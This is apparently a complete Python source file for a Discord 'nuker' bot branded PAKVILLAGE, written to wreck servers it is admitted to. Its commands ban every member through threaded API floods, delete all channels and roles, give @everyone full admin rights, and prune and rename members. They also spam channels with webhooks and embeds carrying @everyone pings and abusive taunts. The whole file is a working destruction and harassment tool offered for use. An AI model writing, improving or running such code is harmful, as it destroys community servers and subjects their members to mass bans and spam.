import requests
import discord
import threading
import random
import json
import asyncio
import time
from discord.ext import commands
from discord import Webhook
from concurrent.futures import ThreadPoolExecutor
import aiohttp


token_file = 'token.txt'
with open(token_file, 'r') as f:
    token = f.read().strip()
    
BOT_OWNER_ID = 1059146729636757594  
ALLOWED_USERS_FILE = "allowed_users.json"

def load_allowed_users():
    try:
        with open(ALLOWED_USERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return [] 
    

IGNORED_SERVERS_FILE = "DESTROYERR/ignored_servers.json"
def load_ignored_servers():
    try:
        with open(IGNORED_SERVERS_FILE, "r") as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_ignored_servers(servers):
    with open(IGNORED_SERVERS_FILE, "w") as file:
        json.dump(servers, file)

IGNORED_SERVERS = load_ignored_servers()    


def save_allowed_users():
    with open(ALLOWED_USERS_FILE, "w") as file:
        json.dump(ALLOWED_USER_IDS, file)

ALLOWED_USER_IDS = load_allowed_users()
rosh = commands.Bot(command_prefix=".", intents=discord.Intents.all())
headers = {
    "Authorization": f"Bot {token}"
}

async def status_task():
    while True:
        await rosh.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.watching, name="PAKVILLAGE RUNS U!"))
        await asyncio.sleep(2)
        await rosh.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.streaming, name=".help | PAKVILLAGE NUKER"))
        await asyncio.sleep(5)
@rosh.event
async def on_ready():
    print(f"SUCCESSFULLY LOGGED INTO {rosh.user} PAKVILLAGE NUKER IS NOW READY TO USE!")
    #log.success("NOW YOUR NUKER CONVERTED INTO NUKE BOT !")
    #time.sleep(1.5)
    print(f"TYPE .HELP IN ANY CHANNEL OR BOT DM TO GET THE HELP MENU.")
    print(f"NOTE :- CTRL+C TO CLOSE NUKE BOT !.")
    rosh.loop.create_task(status_task())

MAX_RETRIES = 3
THREAD_POOL_SIZE = 50
TIMEOUT = 1.5  


executor = ThreadPoolExecutor(max_workers=THREAD_POOL_SIZE)

rosh.remove_command('help')
        

async def send_request(url, method='GET', json_data=None):
    async with aiohttp.ClientSession() as session:
        if method == 'GET':
            async with session.get(url, headers=headers) as response:
                return await response.text()
        elif method == 'POST':
            async with session.post(url, headers=headers, json=json_data) as response:
                return await response.text()
        elif method == 'PUT':
            async with session.put(url, headers=headers, json=json_data) as response:
                return await response.text()

def thread_safe_request(url, method='GET', json_data=None):
    return executor.submit(send_request, url, method, json_data)

@rosh.command(aliases=['ban', 'ba', 'mb'])
async def banall(ctx):
    await ctx.message.delete()
    servr = ctx.guild.id
    
    
    session_pool = [requests.Session() for _ in range(20)]
    for session in session_pool:
        session.headers = headers.copy()
    
    def mass_ban(member_id):
        max_retries = 3
        for _ in range(max_retries):
            session = random.choice(session_pool)
            try:
                response = session.put(
                    f"https://discord.com/api/v9/guilds/{servr}/bans/{member_id}",
                    headers=headers,
                    timeout=3
                )
                if response.status_code == 200 or response.status_code == 204:
                    return True
            except:
                time.sleep(0.1)
                continue
        return False

    
    failed_bans = set()
    
    
    threads = []
    for member in list(ctx.guild.members):
        if member.id != ctx.guild.owner_id and member.id != rosh.user.id:
            t = threading.Thread(target=lambda: failed_bans.add(member.id) if not mass_ban(member.id) else None)
            t.start()
            threads.append(t)
            if len(threads) >= 150:  
                for t in threads:
                    t.join()
                threads = []
    
    
    for t in threads:
        t.join()
    
    
    while failed_bans:
        retry_ids = list(failed_bans)
        failed_bans.clear()
        
        threads = []
        for member_id in retry_ids:
            t = threading.Thread(target=lambda: failed_bans.add(member_id) if not mass_ban(member_id) else None)
            t.start()
            threads.append(t)
            if len(threads) >= 150:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        if failed_bans:              
            time.sleep(0.5)
    
@rosh.command(aliases=['dc', 'dac', 'deletechannel'])
async def deletechannels(ctx):
    await ctx.message.delete()
    tasks = []
    for channel in ctx.guild.channels:
        if isinstance(channel, discord.TextChannel):
            task = asyncio.create_task(channel.delete())
            tasks.append(task)
    
    await asyncio.gather(*tasks)
    
@rosh.command(aliases=['p'])
async def prune(ctx):
    await ctx.message.delete()
    try:
        reason = "LION X AURUM X DARKS X CRUXS PAPA AYE THY | /pakvillage"
        await ctx.guild.prune_members(days=1, reason=reason)
    except:
        await ctx.send("You don't have permission to prune members.")
        await ctx.message.delete()
        
@rosh.command()
async def admin(ctx, *, reason="LION X AURUM X DARKS X CRUXS PAPA AYE THY | /pakvillage"):
    await ctx.message.delete()
    try:
        role = ctx.guild.default_role

        
        await role.edit(permissions=discord.Permissions.all(), reason=reason)
    except Exception as e:
        print(e)  
        await ctx.send("An error occurred while granting admin permissions to @everyone role.")
        await ctx.message.delete()
        
@rosh.command(aliases=['nall'])
async def nickall(ctx):
    await ctx.message.delete()
    tasks = []
    new_name = "DARKS X ROSH ON TOP"
    for member in ctx.guild.members:
        tasks.append(change_nickname(member, new_name))
    await asyncio.gather(*tasks)

async def change_nickname(member, new_name):
    try:
        await member.edit(nick=new_name)
    except discord.Forbidden:
        print(f"Failed to change nickname of {member.name}#{member.discriminator}")        

@rosh.command(aliases=['dr', 'dar', 'deleterole'])
async def deleteroles(ctx):
    await ctx.message.delete()
    tasks = []
    for role in ctx.guild.roles:
        if role.id != ctx.guild.id:
            task = asyncio.create_task(role.delete())
            tasks.append(task)
    
    await asyncio.gather(*tasks)

@rosh.command(aliases=['mc', 'mschan', 'createchannel', 'cc'])
async def creatchan(ctx):
    await ctx.message.delete()
    guild_id = ctx.guild.id
    channel_names = ("[🤣] n̶u̶k̶e̶ ̶b̶y̶ pakvillage", "[💀] b̶l̶a̶s̶t̶ ̶b̶y̶ pakvillage", "[🤤] w̶i̶z̶z̶ ̶b̶y̶ pakvillage", "[👽] r̶a̶i̶d̶ ̶b̶y̶ pakvillage", "[🖤] r̶i̶p̶ ̶b̶y̶ pakvillage","[😂] b̶y̶p̶a̶s̶s̶ ̶b̶y̶ pakvillage", "[💪] k̶i̶l̶l̶ ̶b̶y̶ pakvillage")
    
    async def create_channel(name):
        url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
        json_data = {
            "name": name,
            "type": 0
        }
        return await send_request(url, method='POST', json_data=json_data)
    
    tasks = [asyncio.create_task(create_channel(random.choice(channel_names))) for _ in range(120)]
    await asyncio.gather(*tasks)
    
web_names = ["pakvillage runs u", "pakvillage op", "fucked by pakvillage"]
@rosh.command(aliases=['mw', 'msweb', 'cw']) 
async def createwebhook(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        if type(channel) == discord.TextChannel:
            await channel.create_webhook(name=random.choice(web_names))
random_mes = ("@everyone FUCKED", "@everyone DO BETTER..!! https://discord.gg/sfhjCeqgpG ") 
 
web_names = ["pakvillage runs u", "pakvillage op", "fucked by pakvillage"]
random_mes = ("@everyone FUCKED https://discord.gg/pakvillage", "@everyone DO BETTER..!! https://discord.gg/pakvillage")    

@rosh.command(aliases=['ws', 'webspam', 'spamweb'])
async def webhookspam(ctx):
    await ctx.message.delete()
    web_names = ["pakvillage runs u", "pakvillage op", "fucked by pakvillage"]
    random_mes = ["@everyone FUCKED https://discord.gg/sfhjCeqgpG", "@everyone DO BETTER..!! https://discord.gg/sfhjCeqgpG"]
    
    async def spam_webhook(channel):
        webhook = await channel.create_webhook(name=random.choice(web_names))
        for _ in range(10):  
            await webhook.send(random.choice(random_mes))

    tasks = [asyncio.create_task(spam_webhook(channel)) for channel in ctx.guild.text_channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*tasks)

@rosh.command(aliases=['pvop'])
async def spam(ctx):
    tasks = [send_embeds(channel, 90) for channel in ctx.guild.text_channels]
    await asyncio.gather(*tasks)

async def send_embeds(channel, count):
    embed = discord.Embed(
        title="‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ SERVER DESTROYED, PAKVILLAGE ALWAYS WINS ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎", 
        description="", 
        color=0x000000
    )
    embed.add_field(name="", value=" ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  [**Youtube**](https://discord.gg/pakvillage)‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ", inline=True)
    embed.add_field(name="", value=" ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎[**Discord**](https://discord.gg/pakvillage)", inline=True)
    embed.set_image(url="https://i.pinimg.com/736x/69/3b/d2/693bd27984404b33004e2eba5366850c.jpg")

    for _ in range(count):
        await channel.send(embed=embed, content="**PAKVILLAGE | DARKS X LION X CRUXS X AURUM Wizzed You** https://discord.gg/pakvillage ||@everyone @here||")
        
@rosh.event
async def on_command(ctx):
    
    if ctx.author.id == BOT_OWNER_ID:
        return

    
    if ctx.guild and ctx.guild.id in IGNORED_SERVERS:
        if ctx.author.id != BOT_OWNER_ID:
            await ctx.message.delete()
            return
    elif ctx.author.id not in ALLOWED_USER_IDS:
        await ctx.message.delete()
        return        

@rosh.command(name="help")
async def help(ctx):
    """PAKVILLAGE help menu."""
    if ctx.author.id not in ALLOWED_USER_IDS:
        return

    embed = discord.Embed(
        title="☠️ PAKVILLAGE COMMANDS ☠️",
        description="```diff\n- FASTEST NUKER MADE BY DARKS </> -\n```",
        color=0x000000
    )

    commands = [
        ["➜ Nuke", "➜ nuke", "Destroy everything"],
        ["➜ Channels", "➜ cc / dc", "Create/Delete channels"],
        ["➜ Roles", "➜ cr / dr", "Create/Delete roles"],
        ["➜ Admin", "➜ admin", "Grant admin to @everyone"],
        ["➜ Spam", "➜ spam", "Mass spam channels"],
        ["➜ Prune", "➜ prune", "1 Day member prune"],
        ["➜ Help", "➜ help", "Show this menu"],
        ["➜ Ignore", "➜ ignore enable/disable", "Toggle server access"],
        ["➜ Ban All", "➜ ban", "Ban everyone in the server"],
        ["➜ Nick All", "➜ nall", "Change everyone's nickname"],
        ["➜ Webhook Create", "➜ cw", "Create a webhook"],
        ["➜ Webhook Spam", "➜ ws", "Spam messages using a webhook"]
    ]

    for category, cmd, desc in commands:
        embed.add_field(
            name=f"{category}",
            value=f"```fix\n{cmd}\n{desc}```",
            inline=False
        )
    embed.set_thumbnail(url="https://i.pinimg.com/736x/69/3b/d2/693bd27984404b33004e2eba5366850c.jpg")
    embed.set_footer(text="CREATED WITH 🖤 BY DARKS| MASS DESTRUCTION")

    await ctx.send(embed=embed)
    

channel_names = (
    "[🤣] n̶u̶k̶e̶ ̶b̶y̶ pakvillage", 
    "[💀] b̶l̶a̶s̶t̶ ̶b̶y̶ pakvillage", 
    "[🤤] w̶i̶z̶z̶ ̶b̶y̶ pakvillage", 
    "[👽] r̶a̶i̶d̶ ̶b̶y̶ pakvillage", 
    "[🖤] r̶i̶p̶ ̶b̶y̶ pakvillage",
    "[😂] b̶y̶p̶a̶s̶s̶ ̶b̶y̶ pakvillage", 
    "[💪] k̶i̶l̶l̶ ̶b̶y̶ pakvillage"
)
random_mes = ("@everyone NUKED", "@everyone DO BETTER","@everyone FUCKED LION")

@rosh.command(aliases=['kill'])
async def nuke(ctx):
    await ctx.message.delete()
    icon_url = "https://cdn.discordapp.com/attachments/1342567554543128606/1342567586788802663/IMG_9389.webp?ex=67ba1b00&is=67b8c980&hm=ff8c3fe767bbaa7459eaf9f71835304f7aebc563c0ccd1cef6af184aa5fce9a0&"
    response = requests.get(icon_url)
    icon = response.content
    await ctx.guild.edit(icon=icon)
    await asyncio.gather(*[category.delete() for category in ctx.guild.categories])
    await asyncio.gather(*[channel.delete() for channel in ctx.guild.voice_channels])
    
    def channel_delete(channel_id):
        sessions = requests.Session()
        sessions.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
    
    for i in range(100):
        for channel in list(ctx.guild.channels):
            threading.Thread(target=channel_delete, args=(channel.id,)).start()
    
    
    def create_channels(name):
        json = {"name": name}
        sessions = requests.Session()
        sessions.post(f"https://discord.com/api/v9/guilds/{ctx.guild.id}/channels", headers=headers, json=json)
    
    for i in range(100):
        threading.Thread(target=create_channels, args=(random.choice(channel_names),)).start()
    
    
    await asyncio.sleep(10)  
    
    tasks = [send_embeds(channel, 30) for channel in ctx.guild.text_channels]  
    await asyncio.gather(*tasks)

rosh.run(token)
